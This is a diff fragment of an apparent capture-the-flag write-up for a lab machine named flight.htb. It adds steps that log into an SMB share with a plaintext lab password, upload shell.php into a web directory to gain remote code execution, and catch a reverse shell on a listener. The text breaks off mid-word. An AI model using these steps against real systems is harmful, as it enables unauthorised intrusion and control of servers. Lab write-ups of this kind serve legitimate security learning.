@@ -510,7 +510,14 @@ penelope -p 1337
 ```
 This set me a listener ready for a reverse shell
 
-
 ```python
-
+smbclient //g0.flight.htb/Web -U 'c.bum'%'Tikkycoll_431012284'
+smb: \> cd school.flight.htb\
+smb: \school.flight.htb\> put shell.php
+putting file shell.php as \school.flight.htb\shell.php (0.8 kB/s) (average 0.8 kB/s)
+smb: \school.flight.htb\> 
 ```
+This planted the shell now i can browse to it!
+
+![[Pasted image 20260331182147.png]]
+As seen here i now have Remote Code Executio
